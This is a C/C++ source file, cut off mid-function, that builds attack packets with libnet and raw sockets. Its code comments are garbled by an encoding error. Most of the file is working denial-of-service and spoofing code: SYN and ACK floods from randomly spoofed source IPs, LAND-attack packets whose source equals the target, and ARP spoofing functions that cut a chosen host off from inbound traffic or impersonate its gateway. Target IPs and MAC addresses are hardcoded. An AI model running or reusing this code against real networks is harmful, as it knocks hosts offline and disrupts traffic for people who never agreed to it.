//#ifndef TCP_DOS_SUPPORT
//#define TCP_DOS_SUPPORT

#include <libnet.h>
#include <string.h>
#include <string>
//#include <stdlib>
#include <iostream>
#include <time.h>
#include <sstream>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netpacket/packet.h>



#define ETHER_HEADER_LEN sizeof(struct ether_header) /* ÒÔÌ«ÍøÖ¡Ê×²¿³€¶È */

#define ETHER_ARP_LEN sizeof(struct ether_arp) /* Õûžöarpœá¹¹³€¶È */

#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN /* ÒÔÌ«Íø + Õûžöarpœá¹¹³€¶È */

#define IP_ADDR_LEN 4 /* IPµØÖ·³€¶È */

#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff} /* ¹ã²¥µØÖ· */

using namespace std;

void err_exit(const char *err_msg);

//{
//    perror(err_msg);
//    exit(1);
//}

/* Ìî³äarp°ü */
struct ether_arp *fill_arp_packet(const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip);
//{
//    struct ether_arp *arp_packet;
//    struct in_addr src_in_addr, dst_in_addr;
//    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;

//    /* IPµØÖ·×ª»» */
//    inet_pton(AF_INET, src_ip, &src_in_addr);
//    inet_pton(AF_INET, dst_ip, &dst_in_addr);

//    /* Õûžöarp°ü */
//    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
//    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
//    arp_packet->arp_pro = htons(ETHERTYPE_IP);
//    arp_packet->arp_hln = ETH_ALEN;
//    arp_packet->arp_pln = IP_ADDR_LEN;
//    arp_packet->arp_op = htons(ARPOP_REQUEST);
//    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
//    memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
//    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
//    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);

//    return arp_packet;
//}

/* arpÇëÇó */


void arp_request(char *if_name, char *dst_ip)
{
    struct sockaddr_ll saddr_ll;
    struct ether_header *eth_header;
    struct ether_arp *arp_packet;
    struct ifreq ifr;
    char buf[ETHER_ARP_PACKET_LEN];
    unsigned char src_mac_addr[ETH_ALEN];
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
    char *src_ip;
    int sock_raw_fd, ret_len, i;

    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
        err_exit("socket()");

    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
    bzero(&ifr, sizeof(struct ifreq));
    /* Íø¿šœÓ¿ÚÃû */
    memcpy(ifr.ifr_name, if_name, strlen(if_name));

    /* »ñÈ¡Íø¿šœÓ¿ÚË÷Òý */
    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) == -1)
        err_exit("ioctl() get ifindex");
    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
    saddr_ll.sll_family = PF_PACKET;

    /* »ñÈ¡Íø¿šœÓ¿ÚIP */
    if (ioctl(sock_raw_fd, SIOCGIFADDR, &ifr) == -1)
        err_exit("ioctl() get ip");
    src_ip = inet_ntoa(((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr);
    printf("local ip:%s\n", src_ip);

    /* »ñÈ¡Íø¿šœÓ¿ÚMACµØÖ· */
    if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr))
        err_exit("ioctl() get mac");
    memcpy(src_mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    printf("local mac");
    for (i = 0; i < ETH_ALEN; i++)
        printf(":%02x", src_mac_addr[i]);
    printf("\n");

    bzero(buf, ETHER_ARP_PACKET_LEN);
    /* Ìî³äÒÔÌ«Ê×²¿ */
    eth_header = (struct ether_header *)buf;
    memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
    eth_header->ether_type = htons(ETHERTYPE_ARP);
    /* arp°ü */
    arp_packet = fill_arp_packet(src_mac_addr, src_ip, dst_ip);
    memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);

    /* ·¢ËÍÇëÇó */
    ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
    if ( ret_len > 0)
        printf("sendto() ok!!!\n");

    close(sock_raw_fd);
}

void arp_receive(string dst_ip,unsigned char * dst_mac)
{
    struct ether_arp *arp_packet;
    char buf[ETHER_ARP_PACKET_LEN];
    int sock_raw_fd, ret_len;

    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
        err_exit("socket()");

    clock_t start, finish;
    double   duration = 0.0;
    start = clock();

    //Ã¿ŽÎµ÷ÓÃarp_reciveœÓÊÕ»ØžŽ°üÊ±ŒäÎª6Ãë£¬³¬Ê±Ö®ºóÖØÐÂµ÷ÓÃarp_requestÖ®ºóÔÙµ÷ÓÃarp_recive

    while (duration<6.0)
    {

    finish = clock();
    duration = (double)(finish - start) / CLOCKS_PER_SEC;

        bzero(buf, ETHER_ARP_PACKET_LEN);
        ret_len = recv(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0);
        if (ret_len > 0)
        {
            /* °þÈ¥ÒÔÌ«Í·²¿ */
            arp_packet = (struct ether_arp *)(buf + ETHER_HEADER_LEN);
            /* arp²Ù×÷ÂëÎª2Žú±íarpÓŠŽð */
            if (ntohs(arp_packet->arp_op) == 2)
            {
        stringstream stream[4];
        string tmp;
        string d;

        for(int i= 0; i<4;i++)
        {
            unsigned int p = arp_packet->arp_spa[i];
            stream[i] << p;
            stream[i] >> d;
            tmp.append(d);
            if(i<3)
            {
            tmp+=".";
            }

        }


        if(tmp == dst_ip)
        {
            for(int j=0;j<6;j++)
            {
            dst_mac[j] = arp_packet->arp_sha[j];
            }
            break;
        }
            }
        }
    }

    close(sock_raw_fd);
}


string create_random_IP()
{
    srand((unsigned)time(0));
    stringstream stream[4];
    string tmp;
    string d;

    for(int i=0;i<4;i++)
    {
        unsigned int p = rand()%256;
        stream[i] << p;
        stream[i] >> d;
        tmp.append(d);
        if(i<3)
        {
            tmp+=".";
        }

    }
    cout<<tmp.data()<<endl;
    return tmp;
}


int construct_SYN_TCP(string dev,string dst_ip_s,int dst_port)
{

    srand((unsigned)time(0));


    string src_ip_s = create_random_IP();
    cout<<src_ip_s.data()<<endl;

    libnet_t *handle; /* LibnetŸä±ú */
    int packet_size; /* ¹¹ÔìµÄÊýŸÝ°üŽóÐ¡ */

    char device[]= "ens33"; /* Éè±žÃû×Ö,Ò²Ö§³ÖµãÊ®œøÖÆµÄIPµØÖ·,»á×ÔŒºÕÒµœÆ¥ÅäµÄÉè±ž */
    char src_ip_str[] = "192.168.2.148"; /* ÔŽIPµØÖ·×Ö·ûŽ® */
    char dst_ip_str[] = "125.216.249.125"; /* Ä¿µÄIPµØÖ·×Ö·ûŽ® */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* ÔŽMAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* Ä¿µÄMAC */
    u_long dst_ip, src_ip; /* ÍøÂ·ÐòµÄÄ¿µÄIPºÍÔŽIP */
    char error[LIBNET_ERRBUF_SIZE]; /* ³öŽíÐÅÏ¢ */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* ž÷²ãbuildº¯Êý·µ»ØÖµ */
    u_short proto = IPPROTO_TCP; /* Ž«Êä²ãÐ­Òé */
    u_char payload[255] = {0}; /* ³ÐÔØÊýŸÝµÄÊý×é£¬³õÖµÎª¿Õ */
    u_long payload_s = 0; /* ³ÐÔØÊýŸÝµÄ³€¶È£¬³õÖµÎª0 */
    /* °ÑÄ¿µÄIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* °ÑÔŽIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
    /* ³õÊŒ»¯Libnet */

    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL )
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "", sizeof(payload)-1); /* ¹¹ÔìžºÔØµÄÄÚÈÝ */
    payload_s = strlen((char*)payload); /* ŒÆËãžºÔØÄÚÈÝµÄ³€¶È */

#if 0
    /* ¹¹œšTCPµÄÑ¡Ïî,Íš³£ÔÚµÚÒ»žöTCPÍšÐÅ±šÎÄÖÐÉèÖÃMSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    int rand_src_port = rand()%65535;

    tcp_tag = libnet_build_tcp(
                (uint16_t)rand_src_port, /* ÔŽ¶Ë¿Ú */
                (uint16_t)dst_port,      /* Ä¿µÄ¶Ë¿Ú */
                8888,                    /* ÐòÁÐºÅ */
                8889,                    /* È·ÈÏºÅ */
                TH_SYN,                   /* Control flags */
                14600,                    /* Ž°¿Ú³ßŽç */
                0,                        /* Ð£ÑéºÍ,0Îª×Ô¶¯ŒÆËã */
                0,                        /* œôŒ±ÖžÕë */
                LIBNET_TCP_H + payload_s, /* ³€¶È */
                payload,                    /* žºÔØÄÚÈÝ */
                payload_s,                /* žºÔØÄÚÈÝ³€¶È */
                handle,                    /* libnetŸä±ú */
                0                        /* ÐÂœš°ü */
    );

    if (tcp_tag == -1)
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* ¹¹ÔìIPÐ­Òé¿é£¬·µ»ØÖµÊÇÐÂÉú³ÉµÄIPÐ­Òé¿ìµÄÒ»žö±êŒÇ */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IPÐ­Òé¿éµÄ×Ü³€,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,Ëæ»ú²úÉú0~65535 */
        0, /* frag Æ¬Æ«ÒÆ */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,Ëæ»ú²úÉú0~255 */
        proto, /* ÉÏ²ãÐ­Òé */
        0, /* Ð£ÑéºÍ£¬ŽËÊ±Îª0£¬±íÊŸÓÉLibnet×Ô¶¯ŒÆËã */
        src_ip, /* ÔŽIPµØÖ·,ÍøÂçÐò */
        dst_ip, /* Ä¿±êIPµØÖ·,ÍøÂçÐò */
        NULL, /* žºÔØÄÚÈÝ»òÎªNULL */
        0, /* žºÔØÄÚÈÝµÄŽóÐ¡*/
        handle, /* LibnetŸä±ú */
        0 /* Ð­Òé¿é±êŒÇ¿ÉÐÞžÄ»òŽŽœš,0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* ¹¹ÔìÒ»žöÒÔÌ«ÍøÐ­Òé¿é,Ö»ÄÜÓÃÓÚLIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* ÒÔÌ«ÍøÄ¿µÄµØÖ· */
        src_mac, /* ÒÔÌ«ÍøÔŽµØÖ· */
        ETHERTYPE_IP, /* ÒÔÌ«ÍøÉÏ²ãÐ­ÒéÀàÐÍ£¬ŽËÊ±ÎªIPÀàÐÍ */
        NULL, /* žºÔØ£¬ÕâÀïÎª¿Õ */
        0, /* žºÔØŽóÐ¡ */
        handle, /* LibnetŸä±ú */
        0 /* Ð­Òé¿é±êŒÇ£¬0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ */
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    //before sending
    packet_size = libnet_write(handle); /* ·¢ËÍÒÑŸ­¹¹ÔìµÄÊýŸÝ°ü*/
    //after sending
    libnet_destroy(handle); /* ÊÍ·ÅŸä±ú */
    return (0);

}



int construct_land_TCP(string dev,string dst_ip_s,int dst_port)
{

    string src_ip_s = dst_ip_s.data();

    libnet_t *handle; /* LibnetŸä±ú */
    int packet_size; /* ¹¹ÔìµÄÊýŸÝ°üŽóÐ¡ */

    char device[]= "ens33"; /* Éè±žÃû×Ö,Ò²Ö§³ÖµãÊ®œøÖÆµÄIPµØÖ·,»á×ÔŒºÕÒµœÆ¥ÅäµÄÉè±ž */
    char src_ip_str[] = "192.168.2.148"; /* ÔŽIPµØÖ·×Ö·ûŽ® */
    char dst_ip_str[] = "125.216.249.125"; /* Ä¿µÄIPµØÖ·×Ö·ûŽ® */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* ÔŽMAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* Ä¿µÄMAC */
    u_long dst_ip, src_ip; /* ÍøÂ·ÐòµÄÄ¿µÄIPºÍÔŽIP */
    char error[LIBNET_ERRBUF_SIZE]; /* ³öŽíÐÅÏ¢ */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* ž÷²ãbuildº¯Êý·µ»ØÖµ */
    u_short proto = IPPROTO_TCP; /* Ž«Êä²ãÐ­Òé */
    u_char payload[255] = {0}; /* ³ÐÔØÊýŸÝµÄÊý×é£¬³õÖµÎª¿Õ */
    u_long payload_s = 0; /* ³ÐÔØÊýŸÝµÄ³€¶È£¬³õÖµÎª0 */
    /* °ÑÄ¿µÄIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* °ÑÔŽIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
    /* ³õÊŒ»¯Libnet */

    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL )
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "", sizeof(payload)-1); /* ¹¹ÔìžºÔØµÄÄÚÈÝ */
    payload_s = strlen((char*)payload); /* ŒÆËãžºÔØÄÚÈÝµÄ³€¶È */

#if 0
    /* ¹¹œšTCPµÄÑ¡Ïî,Íš³£ÔÚµÚÒ»žöTCPÍšÐÅ±šÎÄÖÐÉèÖÃMSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    int rand_src_port = rand()%65535;

    tcp_tag = libnet_build_tcp(
                (uint16_t)dst_port,       /* ÔŽ¶Ë¿Ú */
                (uint16_t)dst_port,      /* Ä¿µÄ¶Ë¿Ú */
                8888,                    /* ÐòÁÐºÅ */
                8889,                    /* È·ÈÏºÅ */
                TH_SYN,                   /* Control flags */
                14600,                    /* Ž°¿Ú³ßŽç */
                0,                        /* Ð£ÑéºÍ,0Îª×Ô¶¯ŒÆËã */
                0,                        /* œôŒ±ÖžÕë */
                LIBNET_TCP_H + payload_s, /* ³€¶È */
                payload,                    /* žºÔØÄÚÈÝ */
                payload_s,                /* žºÔØÄÚÈÝ³€¶È */
                handle,                    /* libnetŸä±ú */
                0                        /* ÐÂœš°ü */
    );

    if (tcp_tag == -1)
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* ¹¹ÔìIPÐ­Òé¿é£¬·µ»ØÖµÊÇÐÂÉú³ÉµÄIPÐ­Òé¿ìµÄÒ»žö±êŒÇ */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IPÐ­Òé¿éµÄ×Ü³€,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,Ëæ»ú²úÉú0~65535 */
        0, /* frag Æ¬Æ«ÒÆ */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,Ëæ»ú²úÉú0~255 */
        proto, /* ÉÏ²ãÐ­Òé */
        0, /* Ð£ÑéºÍ£¬ŽËÊ±Îª0£¬±íÊŸÓÉLibnet×Ô¶¯ŒÆËã */
        src_ip, /* ÔŽIPµØÖ·,ÍøÂçÐò */
        dst_ip, /* Ä¿±êIPµØÖ·,ÍøÂçÐò */
        NULL, /* žºÔØÄÚÈÝ»òÎªNULL */
        0, /* žºÔØÄÚÈÝµÄŽóÐ¡*/
        handle, /* LibnetŸä±ú */
        0 /* Ð­Òé¿é±êŒÇ¿ÉÐÞžÄ»òŽŽœš,0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* ¹¹ÔìÒ»žöÒÔÌ«ÍøÐ­Òé¿é,Ö»ÄÜÓÃÓÚLIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* ÒÔÌ«ÍøÄ¿µÄµØÖ· */
        src_mac, /* ÒÔÌ«ÍøÔŽµØÖ· */
        ETHERTYPE_IP, /* ÒÔÌ«ÍøÉÏ²ãÐ­ÒéÀàÐÍ£¬ŽËÊ±ÎªIPÀàÐÍ */
        NULL, /* žºÔØ£¬ÕâÀïÎª¿Õ */
        0, /* žºÔØŽóÐ¡ */
        handle, /* LibnetŸä±ú */
        0 /* Ð­Òé¿é±êŒÇ£¬0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ */
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* ·¢ËÍÒÑŸ­¹¹ÔìµÄÊýŸÝ°ü*/
    libnet_destroy(handle); /* ÊÍ·ÅŸä±ú */
    return (0);
}




int construct_ack_TCP(string dev,string dst_ip_s,int dst_port)
{
    srand((unsigned)time(0));


    string src_ip_s = create_random_IP();

    libnet_t *handle; /* LibnetŸä±ú */
    int packet_size; /* ¹¹ÔìµÄÊýŸÝ°üŽóÐ¡ */

    char device[]= "ens33"; /* Éè±žÃû×Ö,Ò²Ö§³ÖµãÊ®œøÖÆµÄIPµØÖ·,»á×ÔŒºÕÒµœÆ¥ÅäµÄÉè±ž */
    char src_ip_str[] = "192.168.2.148"; /* ÔŽIPµØÖ·×Ö·ûŽ® */
    char dst_ip_str[] = "125.216.249.125"; /* Ä¿µÄIPµØÖ·×Ö·ûŽ® */

    u_char src_mac[6] = {0x00, 0x0c, 0x29, 0xba, 0xee, 0xdd}; /* ÔŽMAC */
    u_char dst_mac[6] = {0x00, 0x0c, 0x29, 0x6d, 0x4d, 0x5c}; /* Ä¿µÄMAC */
    u_long dst_ip, src_ip; /* ÍøÂ·ÐòµÄÄ¿µÄIPºÍÔŽIP */
    char error[LIBNET_ERRBUF_SIZE]; /* ³öŽíÐÅÏ¢ */
    libnet_ptag_t eth_tag, ip_tag, tcp_tag, tcp_op_tag; /* ž÷²ãbuildº¯Êý·µ»ØÖµ */
    u_short proto = IPPROTO_TCP; /* Ž«Êä²ãÐ­Òé */
    u_char payload[255] = {0}; /* ³ÐÔØÊýŸÝµÄÊý×é£¬³õÖµÎª¿Õ */
    u_long payload_s = 0; /* ³ÐÔØÊýŸÝµÄ³€¶È£¬³õÖµÎª0 */
    /* °ÑÄ¿µÄIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* °ÑÔŽIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);
    /* ³õÊŒ»¯Libnet */

    if ( (handle = libnet_init(LIBNET_LINK, dev.data(), error)) == NULL )
    {
        printf("libnet_init failure\n");
        return (-1);
    };
    strncpy((char*)payload, "", sizeof(payload)-1); /* ¹¹ÔìžºÔØµÄÄÚÈÝ */
    payload_s = strlen((char*)payload); /* ŒÆËãžºÔØÄÚÈÝµÄ³€¶È */

#if 0
    /* ¹¹œšTCPµÄÑ¡Ïî,Íš³£ÔÚµÚÒ»žöTCPÍšÐÅ±šÎÄÖÐÉèÖÃMSS */
    tcp_op_tag = libnet_build_tcp_options(
                payload,
                payload_s,
                handle,
                0
    );
    if (tcp_op_tag == -1) {
        printf("build_tcp_options failure\n");
        return (-2);
    };
#endif

    int rand_src_port = rand()%65535;

    tcp_tag = libnet_build_tcp(
                (uint16_t)rand_src_port, /* ÔŽ¶Ë¿Ú */
                (uint16_t)dst_port,      /* Ä¿µÄ¶Ë¿Ú */
                8888,                    /* ÐòÁÐºÅ */
                8889,                    /* È·ÈÏºÅ */
                TH_ACK,                   /* Control flags */
                14600,                    /* Ž°¿Ú³ßŽç */
                0,                        /* Ð£ÑéºÍ,0Îª×Ô¶¯ŒÆËã */
                0,                        /* œôŒ±ÖžÕë */
                LIBNET_TCP_H + payload_s, /* ³€¶È */
                payload,                    /* žºÔØÄÚÈÝ */
                payload_s,                /* žºÔØÄÚÈÝ³€¶È */
                handle,                    /* libnetŸä±ú */
                0                        /* ÐÂœš°ü */
    );

    if (tcp_tag == -1)
    {
        printf("libnet_build_tcp failure\n");
        return (-3);
    };

    /* ¹¹ÔìIPÐ­Òé¿é£¬·µ»ØÖµÊÇÐÂÉú³ÉµÄIPÐ­Òé¿ìµÄÒ»žö±êŒÇ */
    ip_tag = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, /* IPÐ­Òé¿éµÄ×Ü³€,*/
        0, /* tos */
        (u_short) libnet_get_prand(LIBNET_PRu16), /* id,Ëæ»ú²úÉú0~65535 */
        0, /* frag Æ¬Æ«ÒÆ */
        (u_int8_t)libnet_get_prand(LIBNET_PR8), /* ttl,Ëæ»ú²úÉú0~255 */
        proto, /* ÉÏ²ãÐ­Òé */
        0, /* Ð£ÑéºÍ£¬ŽËÊ±Îª0£¬±íÊŸÓÉLibnet×Ô¶¯ŒÆËã */
        src_ip, /* ÔŽIPµØÖ·,ÍøÂçÐò */
        dst_ip, /* Ä¿±êIPµØÖ·,ÍøÂçÐò */
        NULL, /* žºÔØÄÚÈÝ»òÎªNULL */
        0, /* žºÔØÄÚÈÝµÄŽóÐ¡*/
        handle, /* LibnetŸä±ú */
        0 /* Ð­Òé¿é±êŒÇ¿ÉÐÞžÄ»òŽŽœš,0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ*/
    );
    if (ip_tag == -1) {
        printf("libnet_build_ipv4 failure\n");
        return (-4);
    };
    /* ¹¹ÔìÒ»žöÒÔÌ«ÍøÐ­Òé¿é,Ö»ÄÜÓÃÓÚLIBNET_LINK */
    eth_tag = libnet_build_ethernet(
        dst_mac, /* ÒÔÌ«ÍøÄ¿µÄµØÖ· */
        src_mac, /* ÒÔÌ«ÍøÔŽµØÖ· */
        ETHERTYPE_IP, /* ÒÔÌ«ÍøÉÏ²ãÐ­ÒéÀàÐÍ£¬ŽËÊ±ÎªIPÀàÐÍ */
        NULL, /* žºÔØ£¬ÕâÀïÎª¿Õ */
        0, /* žºÔØŽóÐ¡ */
        handle, /* LibnetŸä±ú */
        0 /* Ð­Òé¿é±êŒÇ£¬0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ */
    );
    if (eth_tag == -1) {
        printf("libnet_build_ethernet failure\n");
        return (-5);
    };
    packet_size = libnet_write(handle); /* ·¢ËÍÒÑŸ­¹¹ÔìµÄÊýŸÝ°ü*/
    libnet_destroy(handle); /* ÊÍ·ÅŸä±ú */
    return (0);
}



int ARP_block_single_host_in(string dev,string src_ip_s)
{
    //žÃº¯Êý×è¶ÏÄ¿±ê»úÆ÷œÓÊÜÍâ²¿·¢ËÍÏòžÃÖ÷»úµÄÊýŸÝ°ü(¶ÔÍø¶ÎÄÚÆäËûÖ÷»ú¹ã²¥Ò»žöŒÙµÄÄ¿±êÖ÷»úµÄmacµØÖ·)
    libnet_t *handle;        /* LibnetŸä±ú */
    int packet_size;

    srand((unsigned)time(0));
    string dst_ip_s = create_random_IP();

    char *device = "eth0";   /* Éè±žÃû×Ö,Ò²Ö§³ÖµãÊ®œøÖÆµÄIPµØÖ·,»á×ÔŒºÕÒµœÆ¥ÅäµÄÉè±ž */

//    u_int8_t *src_ip_str = "192.168.128.200";       /* ÔŽIPµØÖ·×Ö·ûŽ® */   //ÕâÀïÊÇ±»¹¥»÷µÄÄ¿±êÖ÷»úµÄIPµØÖ·
  //  u_int8_t *dst_ip_str = "192.168.128.88";        /* Ä¿µÄIPµØÖ·×Ö·ûŽ® */ //ÕâžöÆäÊµ²»ÖØÒªÒòÎªÊÇarp¹ã²¥°ü

    u_int8_t src_mac[6] = {0x00, 0x0c, 0x29, 0x73, 0xfa, 0x86};/* ÔŽMAC */
    u_int8_t dst_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};/* Ä¿µÄMAC,¹ã²¥µØÖ· */

    /* œÓÊÕ·œMAC,ARPÇëÇóÄ¿µÄŸÍÊÇÒªÑ¯ÎÊ¶Ô·œMAC,ËùÒÔÕâÀïÌîÐŽ0 */
    u_int8_t rev_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    u_int32_t dst_ip, src_ip;              /* ÍøÂ·ÐòµÄÄ¿µÄIPºÍÔŽIP */
    char error[LIBNET_ERRBUF_SIZE];        /* ³öŽíÐÅÏ¢ */
    libnet_ptag_t arp_proto_tag, eth_proto_tag;

    /* °ÑÄ¿µÄIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    dst_ip = libnet_name2addr4(handle, (char*)dst_ip_s.data(), LIBNET_RESOLVE);
    /* °ÑÔŽIPµØÖ·×Ö·ûŽ®×ª»¯³ÉÍøÂçÐò */
    src_ip = libnet_name2addr4(handle, (char*)src_ip_s.data(), LIBNET_RESOLVE);

    if ( dst_ip == -1 || src_ip == -1 ) {
        printf("ip address convert error\n");
        exit(-1);
    };
    /* ³õÊŒ»¯Libnet,×¢ÒâµÚÒ»žö²ÎÊýºÍTCP³õÊŒ»¯²»Í¬ */
    if ( (handle = libnet_init(LIBNET_LINK_ADV, dev.data(), error)) == NULL ) {
        printf("libnet_init: error [%s]\n", error);
        exit(-2);
    };

    /* ¹¹ÔìarpÐ­Òé¿é */
    arp_proto_tag = libnet_build_arp(
                ARPHRD_ETHER,        /* Ó²ŒþÀàÐÍ,1±íÊŸÒÔÌ«ÍøÓ²ŒþµØÖ· */
                ETHERTYPE_IP,        /* 0x0800±íÊŸÑ¯ÎÊIPµØÖ· */
                6,                   /* Ó²ŒþµØÖ·³€¶È */
                4,                   /* IPµØÖ·³€¶È */
                ARPOP_REQUEST,       /* ²Ù×÷·œÊœ:ARPÇëÇó */
                src_mac,             /* source MAC addr */
                (u_int8_t *)&src_ip, /* src proto addr */
                rev_mac,             /* dst MAC addr */
                (u_int8_t *)&dst_ip, /* dst IP addr */
                NULL,                /* no payload */
                0,                   /* payload length */
                handle,              /* libnet tag */
                0                    /* Create new one */
    );
    if (arp_proto_tag == -1)    {
        printf("build IP failure\n");
        exit(-3);
    };

    /* ¹¹ÔìÒ»žöÒÔÌ«ÍøÐ­Òé¿é
    You should only use this function when
    libnet is initialized with the LIBNET_LINK interface.*/
    eth_proto_tag = libnet_build_ethernet(
        dst_mac,         /* ÒÔÌ«ÍøÄ¿µÄµØÖ· */
        src_mac,         /* ÒÔÌ«ÍøÔŽµØÖ· */
        ETHERTYPE_ARP,   /* ÒÔÌ«ÍøÉÏ²ãÐ­ÒéÀàÐÍ£¬ŽËÊ±ÎªARPÇëÇó */
        NULL,            /* žºÔØ£¬ÕâÀïÎª¿Õ */
        0,               /* žºÔØŽóÐ¡ */
        handle,          /* LibnetŸä±ú */
        0                /* Ð­Òé¿é±êŒÇ£¬0±íÊŸ¹¹ÔìÒ»žöÐÂµÄ */
    );
    if (eth_proto_tag == -1) {
        printf("build eth_header failure\n");
        return (-4);
    };

    packet_size = libnet_write(handle);    /* ·¢ËÍÒÑŸ­¹¹ÔìµÄÊýŸÝ°ü*/

    libnet_destroy(handle);                /* ÊÍ·ÅŸä±ú */

    return (0);
}

int ARP_block_single_host_out(string dev,string dst_ip_s,string src_ip_s)
{
    //žÃº¯Êý×è¶ÏÄ¿±ê»úÆ÷ÏòÍâ²¿·¢ËÍÊýŸÝ°üµÄ¹ŠÄÜ(¶ÔžÃ»úÆ÷ÉùÃ÷Ò»žöŒÙµÄÍø¹ØmacµØÖ·)
    //dst_ip_sžÉÈÅµÄÄ¿±êIP
    //src_ip_sÃ°³äµÄÍø¹ØIP
    libnet_t *handle;        /* LibnetŸä±ú */
    int packet_size;

    //char *device = "eth0";    /* Éè±žÃû×Ö,Ò²Ö§³ÖµãÊ®œøÖÆµÄIPµØÖ·,»á×ÔŒºÕÒµœÆ¥ÅäµÄÉè±ž */


    //u_int8_t *src_ip_str = "192.168.2.30";        /* Ã°³äµÄÍø¹ØIP */
    //u_int8_t *dst_ip_str = "192.168.2.170";        /* žÉÈÅµÄÄ¿±êIP */

